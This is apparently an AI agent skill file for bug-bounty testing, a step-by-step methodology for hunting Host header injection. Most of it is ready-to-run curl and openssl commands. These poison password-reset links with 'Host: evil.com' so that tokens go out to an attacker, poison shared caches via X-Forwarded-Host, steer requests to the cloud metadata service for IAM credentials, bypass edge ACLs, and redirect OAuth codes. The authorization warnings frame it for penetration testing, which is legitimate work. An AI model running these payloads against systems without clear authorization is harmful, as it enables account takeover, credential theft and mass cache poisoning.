---
name: hunt-host-header
description: Hunt Host Header Injection
category: security
risk: offensive
source: https://github.com/elementalsouls/Claude-BugHunter
source_repo: elementalsouls/Claude-BugHunter
source_type: community
date_added: '2026-09-20'
license: MIT
license_source: https://github.com/elementalsouls/Claude-BugHunter/blob/main/LICENSE
compatibility: Requires explicit written authorization for a target scope plus the
  relevant testing tools for this technique. Docs-only; helper scripts and commands
  not bundled.
sources: portswigger_research, hackerone_public
report_count: 16
---
> **⚠️ AUTHORIZED USE ONLY**
> This skill is for educational purposes or authorized security assessments only.
> You must have explicit, written permission from the system owner before using this tool.
> Misuse of this tool is illegal and strictly prohibited.

> **Mandatory confirmation gate**
> Before running any command that probes, exploits, changes, persists on, extracts data from, or attempts credential access against a target:
> 1. Ask the user to state the exact target URL, IP, account, or resource.
> 2. Ask the user to confirm written authorization and the permitted scope.
> 3. Show the exact command(s) and explain their expected effect.
> 4. Wait for explicit confirmation in the current conversation.
>
> Without that confirmation, remain read-only and provide defensive guidance only. Prefer a sandbox, disposable VM, or controlled lab.

# HUNT-HOST-HEADER — Host Header Injection

## Grounding / Provenance

This skill is built from the public Host-header attack literature, not invented payloads.
Cite the *technique source* in your report, never a fabricated ID:

- **Password-reset poisoning class** — the canonical write-up is Skelet's/Detectify-era
  "Practical HTTP Host header attacks" (the Django `request.get_host()` → password-reset-link
  case). Many frameworks built the reset URL from the request Host with no `ALLOWED_HOSTS`-style
  allowlist. Cite the framework + the reflected-Host behaviour you actually observed.
- **Web cache poisoning via unkeyed Host / X-Forwarded-Host** — PortSwigger Research,
  James Kettle, "Practical Web Cache Poisoning" (2018) and "Web Cache Entanglement" (2020).
  These define unkeyed-input poisoning, which is the mechanism behind X-Forwarded-Host poisoning.
- **Routing-based SSRF** — PortSwigger Research, "Cracking the lens" / routing-based SSRF
  (Host header steers the front-end's upstream selection).

When you write the report, name the exact behaviour you reproduced (reflected header, cache HIT
on a fresh key, OOB hit from your Collaborator). Do **not** copy a CVE or H1 ID you have not
verified — a missing citation is always better than a wrong one.

---

## Crown Jewel Targets

Host header injection that reaches password reset links = Critical (ATO for any user).

**Highest-value chains:**
- **Password reset poisoning → ATO** — server builds the reset link from the request Host;
  attacker sets `Host: evil.com`; the victim's reset email points the token at the attacker →
  token captured on click → full ATO. Pre-account-takeover variant: even the victim *requesting*
  their own reset leaks the token to evil.com.
- **Web cache poisoning via unkeyed Host** — a CDN/reverse proxy caches a response that reflects
  an attacker `X-Forwarded-Host` into an absolute URL (script src, link, redirect) → poisoned
  entry served to every later visitor on that cache key → mass XSS/redirect/CSP bypass.
- **Routing-based SSRF** — the front-end uses the *Host header itself* to pick the upstream;
  `Host: 169.254.169.254` (or an internal hostname) makes it forward your request to that target
  → cloud metadata / internal admin panels.
- **Path-override SSRF / ACL bypass** — IIS/ASP.NET/Spring honour `X-Original-URL` /
  `X-Rewrite-URL` to override the routed path → reach `/admin` or internal endpoints the edge
  ACL thought it blocked. (Different layer from routing SSRF — see Phase 3.)
- **OAuth/OIDC poisoning** — Host drives `redirect_uri` or the OIDC `issuer` / discovery doc →
  auth-code or token theft → ATO.

---

## Attack Surface Signals

```
Any password reset / forgot-password / email-verification / invite endpoint
Any app behind CDN/reverse proxy (Cloudflare, Varnish, Fastly, Akamai, Nginx, HAProxy)
OAuth/OIDC authorization + /.well-known/openid-configuration endpoints
Absolute URLs constructed from request Host (set-password links, share links, webhooks)
Email-sending endpoints (transactional mail, notifications)
Reverse proxies that may route by Host (k8s ingress, service mesh, internal forward proxies)
```

**Dangerous header candidates (unkeyed / trusted inputs):**
```
Host                 X-Forwarded-Host      X-Host
X-Forwarded-Server   X-HTTP-Host-Override  Forwarded
X-Original-URL       X-Rewrite-URL         X-Override-URL   (path-override class)
```

---

## Step-by-Step Hunting Methodology

> Always test against **your own** registered test account. Never request another user's reset.

### Phase 1 — Password Reset Poisoning

```bash
# 1a. Override Host directly
curl -s -X POST https://$TARGET/forgot-password \
  -H "Host: evil.com" \
  -H "Content-Type: application/json" \
  -d '{"email":"your-test-account@target.com"}'

# 1b. X-Forwarded-Host (behind reverse proxy that trusts it)
curl -s -X POST https://$TARGET/forgot-password \
  -H "Host: $TARGET" \
  -H "X-Forwarded-Host: evil.com" \
  -d "email=your-test-account@target.com"

# 1c. Host + X-Forwarded-Host combo, and X-Host
curl -s -X POST https://$TARGET/forgot-password \
  -H "Host: $TARGET" -H "X-Host: evil.com" \
  -d "email=your-test-account@target.com"

# 1d. Dual-Host / Host override smuggling: some stacks read the SECOND Host
printf 'POST /forgot-password HTTP/1.1\r\nHost: %s\r\nHost: evil.com\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 33\r\nConnection: close\r\n\r\nemail=your-test-account@target.com' "$TARGET" \
  | openssl s_client -quiet -connect $TARGET:443 2>/dev/null

# 1e. Absolute-URL injection: keep real Host, append attacker host so the
#     reset link becomes https://TARGET.evil.com/... or routes the token out
curl -s -X POST https://$TARGET/forgot-password \
  -H "Host: $TARGET.evil.com" -d "email=your-test-account@target.com"

# 1f. Trailing-port / userinfo confusion (parsers that split on : or @)
curl -s -X POST https://$TARGET/forgot-password \
  -H "Host: $TARGET:1@evil.com" -d "email=your-test-account@target.com"
```

**Confirm:** open the reset email *in your own test inbox* and read the link host. The token must
appear under an attacker-controlled host (`evil.com`, `$TARGET.evil.com`, or a Collaborator
domain) for this to be a real finding. **Use a Burp Collaborator domain as the injected host** so
that when the victim clicks (or a preview-fetcher fetches), you capture the token out-of-band and
have proof — see Validation.

### Phase 2 — Web Cache Poisoning via Host / X-Forwarded-Host

Mechanism: this is a **reflection** bug, not an OOB bug. The injected host must be *reflected into
the response body* (an absolute URL, script `src`, `<link href>`, `<base href>`, redirect
`Location`, or canonical/og:url) **and** that response must be **cached on a key you do not
control**. No Collaborator callback is expected from the cache test itself — only later, if a
victim's browser loads the poisoned absolute URL.

```bash
# 2a. Is the host reflected into the body?
curl -s https://$TARGET/ \
  -H "Host: $TARGET" -H "X-Forwarded-Host: canary-$RANDOM.example" \
  | grep -i "canary"

# 2b. Is the response cacheable, and what is the cache key?
curl -sI "https://$TARGET/?cb=$RANDOM" \
  | grep -iE "cache-control|cf-cache-status|x-cache|age|via|surrogate|vary"
#   Look for: X-Cache/CF-Cache-Status: HIT, nonzero Age, Via: varnish/fastly/cloudfront.
#   Check Vary: — if Vary does NOT include X-Forwarded-Host, the header is UNKEYED → poisonable.

# 2c. Prove poisoning: poison once, then fetch CLEAN (no injected header) on same key.
URL="https://$TARGET/?cb=poison$RANDOM"
curl -s "$URL" -H "X-Forwarded-Host: evilcdn.example" >/dev/null   # poison
curl -s "$URL" | grep -i "evilcdn.example"                        # clean victim view → reflected = POISONED
```

**False-positive killers (mandatory):**
- A reflection that only ever appears for *your* request (because the header is **keyed**, e.g. in
  `Vary`, or the CDN includes Host in the key) is **not** poisoning — confirm 2c returns the
  payload on a request that *omits* the header.
- `Age: 0` + `MISS` every time → no shared cache → no mass impact. Demote to self-only / Low.
- Confirm blast radius from a **second machine / fresh egress IP / incognito** before claiming
  "mass". Cache scope is often per-edge / per-cookie / per-geo.

### Phase 3 — SSRF via Host Header — TWO DISTINCT MECHANISMS (do not conflate)

These operate at different layers. Test them separately; they do **not** compose into one request.

**(3A) Routing-based SSRF — the Host header selects the upstream.** The path goes on the
**request line**, exactly as a normal request, because the metadata service / internal host serves
plain HTTP and only sees the request line + headers you forward. `X-Original-URL` is irrelevant
here — the EC2 IMDS ignores it.

```bash
# Correct routing-SSRF probe: path on the request line, Host steers the proxy upstream.
curl -s "https://$TARGET/latest/meta-data/" -H "Host: 169.254.169.254"
curl -s "https://$TARGET/latest/meta-data/iam/security-credentials/" -H "Host: 169.254.169.254"

# GCP / Azure equivalents (still routing via Host):
curl -s "https://$TARGET/computeMetadata/v1/" \
  -H "Host: metadata.google.internal" -H "Metadata-Flavor: Google"
curl -s "https://$TARGET/metadata/instance?api-version=2021-02-01" \
  -H "Host: 169.254.169.254" -H "Metadata: true"

# Internal hostname / port routing:
curl -s "https://$TARGET/" -H "Host: localhost:6379"   # Redis behind the proxy
curl -s "https://$TARGET/" -H "Host: internal-admin.svc.cluster.local"

# Blind / no reflection? Point the Host at a Collaborator subdomain and watch for the
# proxy's outbound DNS/HTTP lookup — that proves the front-end resolves the attacker host.
curl -s "https://$TARGET/" -H "Host: $COLLAB"
```

**(3B) Path-override SSRF / ACL bypass — `X-Original-URL` / `X-Rewrite-URL`.** This is an
IIS/ASP.NET/Spring-Cloud-Gateway feature where the app overrides the *routed path*. The real Host
stays put; you are bypassing an **edge path ACL**, not steering an upstream. Keep the real Host.

```bash
# Reach an internal/blocked path the edge thought it denied. Real Host stays.
curl -s "https://$TARGET/" -H "Host: $TARGET" -H "X-Original-URL: /admin"
curl -s "https://$TARGET/" -H "Host: $TARGET" -H "X-Rewrite-URL: /internal/metrics"
# Diff against a direct GET /admin (which the edge blocks) — a different status/body proves override.
```

> The old probe `Host: 169.254.169.254` + `X-Original-URL: /latest/meta-data/` was wrong: those
> two headers act at different layers and never compose. Use 3A for metadata, 3B for ACL bypass.

### Phase 4 — OAuth / OIDC / SAML Poisoning

```bash
# Does the authorization endpoint build redirect_uri / display URL from Host?
curl -s "https://$TARGET/oauth/authorize?response_type=code&client_id=app&redirect_uri=https://$TARGET/cb" \
  -H "Host: evil.com" | grep -iE "redirect|location|action="

# OIDC discovery: if issuer/endpoints reflect Host, the whole flow can be re-pointed.
curl -s "https://$TARGET/.well-known/openid-configuration" -H "X-Forwarded-Host: evil.com" \
  | grep -iE "issuer|authorization_endpoint|token_endpoint|jwks_uri"
```

**Confirm:** the auth code / token must actually be delivered to the attacker host (capture on
Collaborator) — a reflected string alone is not ATO.

### Phase 5 — Header Fuzzing (Param Miner)

Burp **Param Miner → Guess headers** is faster and finds unkeyed/cache-affecting headers the list
below misses. Manual sweep:

```bash
HOST_HEADERS=(X-Forwarded-Host X-Host X-Forwarded-Server X-HTTP-Host-Override \
  Forwarded X-Original-URL X-Rewrite-URL X-Override-URL X-Forwarded-Scheme)
for H in "${HOST_HEADERS[@]}"; do
  echo "=== $H ==="
  curl -s -I "https://$TARGET/" -H "$H: canary-$RANDOM.example" \
    | grep -iE "location|x-cache|cf-cache|age|set-cookie"
done
```

---

## Chain Table

| Finding | Chain to | Impact |
|---------|----------|--------|
| Reset link host = attacker (own test acct) | Collaborator-host injection → capture token on click | Critical — ATO any user |
| X-Forwarded-Host reflected in absolute URL + cacheable, unkeyed | Poison key → clean fetch returns payload → load XSS/redirect | High — mass cache poisoning |
| Front-end routes by Host | `Host: 169.254.169.254` path-on-request-line → creds | High/Critical — SSRF → cloud creds |
| `X-Original-URL` overrides path | Reach `/admin` blocked at edge | High — ACL bypass / SSRF |
| OAuth redirect_uri/issuer built from Host | Re-point flow → capture code/token on Collaborator | Critical — ATO via code theft |

---

## Validation (house discipline)

✅ **Password reset:** the token URL in **your own test account's email** uses an
attacker-controlled host. Strongest proof = inject a **Collaborator** host and show the inbound
HTTP hit carrying the token when the link is clicked/previewed (OOB capture).
✅ **Cache poison:** a request that **omits** the injected header (fresh egress IP / incognito)
still returns the attacker payload → shared-cache poisoning proven. Demote to Low if Vary-keyed or
`MISS`/`Age:0` only.
✅ **Routing SSRF:** real response body from `169.254.169.254` / internal host, **or** an OOB
DNS/HTTP hit on your Collaborator from the front-end (blind case).
✅ **Path-override:** status/body diff vs the edge-blocked direct request proves the override took.
✅ **OAuth/OIDC:** the auth code / token is actually delivered to the attacker host (captured),
not merely reflected.

**Always rule out false positives:**
- Reflected ≠ cached. Cached-for-you ≠ cached-for-others (check `Vary`, second IP).
- A 200 echoing your Host string is not SSRF unless the *response content* came from the internal
  target or your Collaborator fired.
- Some mailers rewrite links to a fixed `SITE_URL` regardless of Host — reflected header in the
  HTTP response does not guarantee a poisoned *email*; verify the email body.

**Severity:**
- Reset → ATO for any user: Critical
- Routing SSRF → cloud metadata creds: Critical (if creds usable) / High
- Cache poisoning → mass XSS/redirect (shared key proven): High
- Path-override → internal/admin reach: High
- Reflected only, uncacheable, not in email, no internal reach: Low / informational

## When to Use

- You have explicit, written authorization to assess the target in scope, and the task matches this skill's vulnerability class or technique within a bug-bounty or penetration-test engagement.
- You need the recon, exploitation, or validation workflow described below — executed strictly inside the approved scope.

## Limitations

- Authorized scope only: the confirmation gate above is mandatory before any probing, exploitation, or credential-access command.
- Docs-only import: upstream helper scripts, commands, engine, and research assets are not bundled; reinstall tooling from the source repo when needed.
- Validate every finding (see `triage-validation`) before reporting; report via `report-writing`. Prefer a sandbox, disposable VM, or controlled lab.

### Example

```bash
# Read-only first step; confirm scope before anything active.
cat scope.txt  # target list from the authorized engagement brief
```

> Adapted from [elementalsouls/Claude-BugHunter](https://github.com/elementalsouls/Claude-BugHunter) (MIT); frontmatter, When to Use/Limitations, and safety boundaries added for upstream compliance. Docs-only import: executable helpers, commands, engine, and research assets not bundled.
